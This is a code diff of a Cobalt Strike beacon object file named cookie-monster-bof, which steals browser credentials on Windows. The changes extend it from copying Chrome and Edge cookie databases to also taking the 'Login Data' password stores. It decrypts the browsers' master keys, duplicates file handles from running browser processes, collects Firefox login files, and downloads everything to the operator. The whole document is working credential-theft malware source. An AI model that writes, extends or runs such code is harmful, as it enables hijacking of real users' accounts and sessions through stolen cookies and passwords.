@@ -9,17 +9,16 @@
 #include "cookie-monster-bof.h"
 #include "beacon.h"
 
-CHAR *GetCookieFileContent(CHAR *path);
+CHAR *GetFileContent(CHAR *path);
 CHAR *ExtractKey(CHAR *buffer);
 VOID GetMasterKey(CHAR *key);
 VOID GetChromeKey();
 VOID GetFirefoxInfo();
 VOID GetEdgeKey();
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile);
-BOOL GetChromeDatabase(DWORD PID);
 VOID GetChromePID();
-BOOL GetEdgeDatabase(DWORD PID);
 VOID GetEdgePID();
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *filename);
 
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
@@ -37,13 +36,10 @@ WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
 WINBASEAPI HANDLE WINAPI  KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
 WINBASEAPI BOOL WINAPI    KERNEL32$Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
 WINBASEAPI BOOL WINAPI    KERNEL32$Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
-//WINBASEAPI DWORD WINAPI   KERNEL32$GetCurrentDirectoryA (DWORD nBufferLength, LPSTR lpBuffer);
 WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess (VOID);
 WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
 WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
-//WINBASEAPI BOOL WINAPI    KERNEL32$WriteFile (HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
-//WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryW (LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
 WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
 WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
 WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
@@ -61,7 +57,6 @@ WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T
     FARPROC time = Resolver("msvcrt", "time");\
     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
     FARPROC rand = Resolver("msvcrt", "rand");
-
 #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
 #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
 #define DATA_FREE(d, l) \
@@ -70,7 +65,6 @@ WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T
         intFree(d); \
         d = NULL; \
     }
-
 #define CSIDL_LOCAL_APPDATA 0x001c
 #define CSIDL_APPDATA 0x001a
 
@@ -80,7 +74,7 @@ FARPROC Resolver(CHAR *lib, CHAR *func) {
     return ptr;
 }
 
-CHAR *GetCookieFileContent(CHAR *path) {
+CHAR *GetFileContent(CHAR *path) {
     CHAR appdata[MAX_PATH];
     HANDLE hFile = NULL;
     IMPORT_RESOLVE;
@@ -117,7 +111,6 @@ CHAR *ExtractKey(CHAR *buffer) {
     //look for pattern with key
     CHAR pattern[] = "encrypted_key\":\"";
     CHAR *start = MSVCRT$strstr(buffer, pattern);
-
     CHAR *end = NULL;
     CHAR *key = NULL;
     DWORD dwSize = 0;
@@ -171,13 +164,12 @@ VOID GetMasterKey(CHAR *key) {
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Key!");
 
-    // // return decrypted key
+    // return decrypted key
     CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (final.cbData * 4) + 1);
     DWORD i = 0;
     for(i = 0; i < final.cbData; i++) {
         sprintf(output, "%s\\x%02x", output, final.pbData[i]);
     }
-
     BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );
 
     // rewind to the start of the buffer
@@ -187,7 +179,7 @@ VOID GetMasterKey(CHAR *key) {
 
 VOID GetChromeKey() {
     //get chrome key
-    CHAR *data = GetCookieFileContent("\\Google\\Chrome\\User Data\\Local State");
+    CHAR *data = GetFileContent("\\Google\\Chrome\\User Data\\Local State");
     CHAR *key = NULL;
 
     if(data == NULL) {
@@ -202,14 +194,13 @@ VOID GetChromeKey() {
         return;
     }
     //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Key ");
-
     GetMasterKey(key);
     return;
 }
 
 VOID GetEdgeKey() {
     //get edge key
-    CHAR *data = GetCookieFileContent("\\Microsoft\\Edge\\User Data\\Local State");
+    CHAR *data = GetFileContent("\\Microsoft\\Edge\\User Data\\Local State");
     CHAR *key = NULL;
     if(data == NULL) {
         BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
@@ -222,9 +213,7 @@ VOID GetEdgeKey() {
         BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
         return;
     }
-
     GetMasterKey(key);
-
 }
 
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
@@ -234,7 +223,6 @@ CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
     // create temp var to hold profile
     tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MSVCRT$strlen(profile) + 1);
     MSVCRT$strncpy(tempProfile, profile, MSVCRT$strlen(profile)+1);
-
     appdata = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MAX_PATH + 1);
 
     //get appdata local path and append path to file
@@ -274,7 +262,6 @@ VOID GetFirefoxInfo() {
     dwSize = KERNEL32$GetFileSize(hFile, NULL);
     buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
     KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
-
     if(dwSize != dwRead) {
         BeaconPrintf(CALLBACK_ERROR,"file size mismatch.\n");
     }
@@ -284,7 +271,6 @@ VOID GetFirefoxInfo() {
     CHAR pattern[] = "Default=Profiles/";
     CHAR *start = MSVCRT$strstr(buffer, pattern);
     CHAR *end = NULL;
-
     if(start == NULL) {
         return;
     }
@@ -298,7 +284,6 @@ VOID GetFirefoxInfo() {
         return ;
     }
     dwSize = end - start;
-
     //BeaconPrintf(CALLBACK_OUTPUT, "Profile size is %d\n", dwSize);
 
     //extract profile from file
@@ -327,8 +312,7 @@ VOID GetFirefoxInfo() {
         KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
         download_file(logins, buffer, dwFileSize);
         KERNEL32$GlobalFree(buffer);
-        KERNEL32$CloseHandle(hFile);
-        
+        KERNEL32$CloseHandle(hFile);  
     }
 
     // get path to logins.json
@@ -359,6 +343,8 @@ VOID GetChromePID() {
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     INT processCount = 0;
+    BOOL databaseStatus = FALSE;
+    BOOL passwordStatus = FALSE;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     //iterate through each handle to find chrome.exe
     if(KERNEL32$Process32First(hSnap, &pe32)) {
@@ -367,14 +353,17 @@ VOID GetChromePID() {
             {
                 //chrome was found, get cookies database
                 processCount++;
-                if ( !GetChromeDatabase(pe32.th32ProcessID) ) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "PID Does not have handle to cookie");
+                if (databaseStatus == FALSE){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Cookies", "ChromeCookie.db")){
+                        databaseStatus = TRUE;
+                    }
                 }
-                else
-                {
-                    BeaconPrintf(CALLBACK_OUTPUT, "COPIED COOKIES FROM PID: %d!", pe32.th32ProcessID);
-                    return;
+                if (passwordStatus == FALSE){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", "ChromePasswords.db")){
+                        passwordStatus = TRUE;
+                    }
                 }
+
             }
         } while(KERNEL32$Process32Next(hSnap, &pe32));
     }
@@ -383,30 +372,29 @@ VOID GetChromePID() {
     if (processCount == 0) {
         //check if file exists
         BeaconPrintf(CALLBACK_OUTPUT,"chrome.exe not found on host\n");
-        CHAR *data = GetCookieFileContent("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
+        CHAR *data = GetFileContent("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
         if(data == NULL) {
             BeaconPrintf(CALLBACK_ERROR,"Chrome COOKIES not found on host\n");
             return;
         }
-        //save data to file
-        // HANDLE hFile = KERNEL32$CreateFileA("GoogleCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-        // DWORD dwRead = 0;
-        // KERNEL32$WriteFile(hFile, data, MSVCRT$strlen(data), &dwRead, NULL);
-        // KERNEL32$CloseHandle(hFile);
 
         download_file("ChromeCookie.db",data, sizeof(data));
         KERNEL32$GlobalFree(data);
-        
-        // print current directory to screen
-        // CHAR cwd[MAX_PATH];
-        // KERNEL32$GetCurrentDirectoryA(MAX_PATH, cwd);
-        // BeaconPrintf(CALLBACK_OUTPUT,"Chrome COOKIES saved to %s \n", cwd);
+
+        CHAR *passwordData = GetFileContent("\\Google\\Chrome\\User Data\\Login Data");
+        if(passwordData == NULL) {
+            BeaconPrintf(CALLBACK_ERROR,"Chrome LOGIN DATA not found on host\n");
+            return;
+        }
+        download_file("ChromePasswords.db",passwordData, sizeof(passwordData));
+        KERNEL32$GlobalFree(passwordData);
     }
 }
 
-BOOL GetChromeDatabase(DWORD PID) {
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
     
-    BeaconPrintf(CALLBACK_OUTPUT,"chrome PID found %d\n", PID);
+    BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
+    BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);
     
     SYSTEM_HANDLE_INFORMATION *shi = NULL;
     DWORD dwNeeded = 0;
@@ -442,6 +430,14 @@ BOOL GetChromeDatabase(DWORD PID) {
                             return FALSE;                   
                         }
 
+                        //when file does not exist on disk, error 87 thrown
+                        if(KERNEL32$GetLastError() == 87) {
+                            KERNEL32$SetLastError(0);
+                            BeaconPrintf(CALLBACK_ERROR,"Wrong Function Call \n Skipping handle \n");
+                            //KERNEL32$GlobalFree(shi);
+                            continue;
+                        }
+
                         FARPROC GetFinalPathNameByHandle = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("kernel32.dll"), "GetFinalPathNameByHandleA");
                         CHAR filename[256];
                         MSVCRT$memset(filename,0, 256);
@@ -460,7 +456,7 @@ BOOL GetChromeDatabase(DWORD PID) {
                             }
                         }
 
-                        if(MSVCRT$strstr(filename, "Cookies") != NULL) {
+                        if(MSVCRT$strstr(filename, browserFile) != NULL) {
                             //BeaconPrintf(CALLBACK_OUTPUT,"COOKIE WAS FOUND\n");
                             KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                             DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
@@ -469,11 +465,7 @@ BOOL GetChromeDatabase(DWORD PID) {
                             CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                             KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
 
-                            // HANDLE hFile = KERNEL32$CreateFileA("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-                            // KERNEL32$WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-                            // KERNEL32$CloseHandle(hFile);
-
-                            download_file("ChromeCookie.db",buffer, dwFileSize);
+                            download_file(downloadFileName,buffer, dwFileSize);
                             
                             KERNEL32$GlobalFree(buffer);
                             return TRUE;
@@ -484,7 +476,7 @@ BOOL GetChromeDatabase(DWORD PID) {
             }
         }
     }
-    BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO COOKIE WAS FOUND \n");
+    BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO %s WAS FOUND \n", browserFile);
     return FALSE;
 }
 
@@ -493,6 +485,8 @@ VOID GetEdgePID() {
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     INT processCount = 0;
+    BOOL databaseStatus = FALSE;
+    BOOL passwordStatus = FALSE;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     //iterate through each handle to find chrome.exe
     if(KERNEL32$Process32First(hSnap, &pe32)) {
@@ -502,16 +496,16 @@ VOID GetEdgePID() {
             {
                 //edge was found, get cookies database
                 processCount++;
-                if ( !GetEdgeDatabase(pe32.th32ProcessID) ) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "PID %d Does not have handle to cookie", pe32.th32ProcessID);
+                if (databaseStatus == FALSE){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Cookies", "EdgeCookie.db")){
+                        databaseStatus = TRUE;
+                    }
                 }
-                else
-                {
-                    BeaconPrintf(CALLBACK_OUTPUT, "COPIED COOKIES FROM PID: %d!", pe32.th32ProcessID);
-                    return;
+                if (passwordStatus == FALSE){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", "EdgePasswords.db")){
+                        passwordStatus = TRUE;
+                    }
                 }
-
-                
             }
         } while(KERNEL32$Process32Next(hSnap, &pe32));
     }
@@ -520,122 +514,21 @@ VOID GetEdgePID() {
     if (processCount == 0) {
         //check if file exists
         BeaconPrintf(CALLBACK_OUTPUT,"msedge.exe not found running on host\n Downloading cookies directly from \\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies ");
-        CHAR *data = GetCookieFileContent("\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies");
+        CHAR *data = GetFileContent("\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies");
         if(data == NULL) {
             BeaconPrintf(CALLBACK_ERROR,"Edge COOKIES not found on host\n");
             return;
         }
-        //save data to file
-        // HANDLE hFile = KERNEL32$CreateFileA("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-        // DWORD dwRead = 0;
-        // KERNEL32$WriteFile(hFile, data, MSVCRT$strlen(data), &dwRead, NULL);
-        // KERNEL32$CloseHandle(hFile);
         download_file("EdgeCookie.db",data, sizeof(data));
 
         KERNEL32$GlobalFree(data);
-
-        // print current directory to screen
-        //CHAR cwd[MAX_PATH];
-        //KERNEL32$GetCurrentDirectoryA(MAX_PATH, cwd);
-        //BeaconPrintf(CALLBACK_OUTPUT,"Edge COOKIES saved to %s \n", cwd);
-    }
-}
-
-BOOL GetEdgeDatabase(DWORD PID) {
-    
-    BeaconPrintf(CALLBACK_OUTPUT,"Edge PID found %d\n", PID);
-    
-    //SYSTEM_HANDLE_INFORMATION *shi = NULL;
-    DWORD dwNeeded = 0;
-    DWORD dwSize = 0xffffff / 2;
-    PSYSTEM_HANDLE_INFORMATION shi;
-    shi = (SYSTEM_HANDLE_INFORMATION *)KERNEL32$GlobalAlloc(GPTR, dwSize);
-    //utilize NtQueryStemInformation to list all handles on system
-
-    NTSTATUS status;
-    status = NTDLL$NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
-
-    //BeaconPrintf(CALLBACK_OUTPUT,"Handle Count %d\n", shi->NumberOfHandles);
-    DWORD i = 0;
-    BOOL firstHandle = TRUE;
-    //iterate through each handle and find our PID and a handle to a file
-    for(i = 0; i < shi->NumberOfHandles; i++) {
-        //check if handle to file
-        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
-            //check if handle is to our PID
-            if(shi->Handles[i].ProcessId == PID) {
-
-                //BeaconPrintf(CALLBACK_OUTPUT,"PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
-                
-                if( (shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x00000002 && shi->Handles[i].GrantedAccess == 0x0012019f))) {
-                        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                        if(hProc == INVALID_HANDLE_VALUE) {
-                            BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
-                            KERNEL32$GlobalFree(shi);
-                            return FALSE;
-                        }
-
-                        HANDLE hDuplicate = NULL;
-                        if(!KERNEL32$DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, KERNEL32$GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
-                            BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
-                            KERNEL32$GlobalFree(shi);
-                            return FALSE;                   
-                        }
-                        //get last error
-                        
-                        if(KERNEL32$GetLastError() == 87) {
-                            KERNEL32$SetLastError(0);
-                            BeaconPrintf(CALLBACK_ERROR,"Wrong Function Call \n Skipping handle \n");
-                            //KERNEL32$GlobalFree(shi);
-                            continue;
-                        }
-
-                        FARPROC GetFinalPathNameByHandle = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("kernel32.dll"), "GetFinalPathNameByHandleA");
-                        CHAR filename[256];
-                        MSVCRT$memset(filename,0, 256);
-                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-                        
-                        //BeaconPrintf(CALLBACK_OUTPUT,"%s\n", filename);
-                        //BeaconPrintf(CALLBACK_OUTPUT,"Length of file name is %d\n", MSVCRT$strlen(filename));
-                        
-                        if(firstHandle) {
-                            DWORD dwFilenameSize = MSVCRT$strlen(filename);
-                            CHAR *newFilename = filename + MSVCRT$strlen(filename) - MSVCRT$strlen("Application");
-                            firstHandle = FALSE;
-
-                            if(MSVCRT$strcmp(newFilename, "Application") == 0) {
-                                //BeaconPrintf(CALLBACK_ERROR,"SKIPPING PID %d\n", PID);
-                                KERNEL32$GlobalFree(shi);
-                                return FALSE;
-                            }
-                        }
-
-                        if(MSVCRT$strstr(filename, "Cookies") != NULL) {
-                            //BeaconPrintf(CALLBACK_OUTPUT,"COOKIE WAS FOUND\n");
-                            KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
-                            //BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
-                            KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-
-                            // HANDLE hFile = KERNEL32$CreateFileA("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-                            // KERNEL32$WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-                            //KERNEL32$CloseHandle(hFile);
-
-                            download_file("EdgeCookie.db",buffer, dwFileSize);
-
-                            KERNEL32$GlobalFree(buffer);
-                            return TRUE;
-                        }
-
-                        KERNEL32$CloseHandle(hDuplicate);
-                }
-            }
+        CHAR *passwordData = GetFileContent("\\Microsoft\\Edge\\User Data\\Default\\Login Data");
+        if(passwordData == NULL) {
+            BeaconPrintf(CALLBACK_ERROR,"Edge LOGIN DATA not found on host\n");
+            return;
         }
+        download_file("EdgePasswords.db",passwordData, sizeof(passwordData));
     }
-    BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO COOKIE WAS FOUND \n");
-    return FALSE;
 }
 
 // nanodump fileless download
@@ -735,12 +628,13 @@ BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLengt
 VOID go(char *buf, int len) {
     //parse command line arguements
     datap parser;
-
     int chrome = 1;
     int edge = 1; 
     int firefox = 1;
-    int chromePID = 1;
-    int edgePID = 1;
+    int chromeCookiesPID = 1;
+    int chromeLoginDataPID = 1;
+    int edgeCookiesPID = 1;
+    int edgeLoginDataPID = 1;
     int pid = 1; 
     
     BeaconDataParse(&parser, buf, len);
@@ -748,8 +642,10 @@ VOID go(char *buf, int len) {
     chrome = BeaconDataInt(&parser);
     edge = BeaconDataInt(&parser);
     firefox = BeaconDataInt(&parser);
-    chromePID = BeaconDataInt(&parser);
-    edgePID = BeaconDataInt(&parser);
+    chromeCookiesPID = BeaconDataInt(&parser);
+    chromeLoginDataPID = BeaconDataInt(&parser);
+    edgeCookiesPID = BeaconDataInt(&parser);
+    edgeLoginDataPID = BeaconDataInt(&parser);
     pid = BeaconDataInt(&parser);
 
     if (chrome == 0 ){
@@ -769,20 +665,32 @@ VOID go(char *buf, int len) {
         GetFirefoxInfo();
         return;
     }
-    else if (chromePID == 0){
-        BeaconPrintf(CALLBACK_OUTPUT, "CHROMEPID SELECTED");
+    else if (chromeCookiesPID == 0){
+        BeaconPrintf(CALLBACK_OUTPUT, "CHROME Cookies SELECTED");
         BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
         GetChromeKey();
-        //GetEdgePID();
-        GetChromeDatabase(pid);
+        GetBrowserFile(pid, "Cookies", "ChromeCookie.db");
         return;
     }
-    else if (edgePID == 0){
-        BeaconPrintf(CALLBACK_OUTPUT, "EDGEPID SELECTED");
+    else if (chromeLoginDataPID == 0){
+        BeaconPrintf(CALLBACK_OUTPUT, "CHROME Login Data SELECTED");
+        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        GetChromeKey();
+        GetBrowserFile(pid, "Login Data", "ChromePasswords.db");
+        return;
+    }
+    else if (edgeCookiesPID == 0){
+        BeaconPrintf(CALLBACK_OUTPUT, "EDGE Cookies SELECTED");
         BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
         GetEdgeKey();
-        //GetEdgePID();
-        GetEdgeDatabase(pid);
+        GetBrowserFile(pid, "Cookies", "EdgeCookie.db");
+        return;
+    }
+    else if (edgeLoginDataPID == 0){
+        BeaconPrintf(CALLBACK_OUTPUT, "EDGE Login Data SELECTED");
+        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
+        GetEdgeKey();
+        GetBrowserFile(pid, "Login Data", "EdgePasswords.db");
         return;
     }
     else{
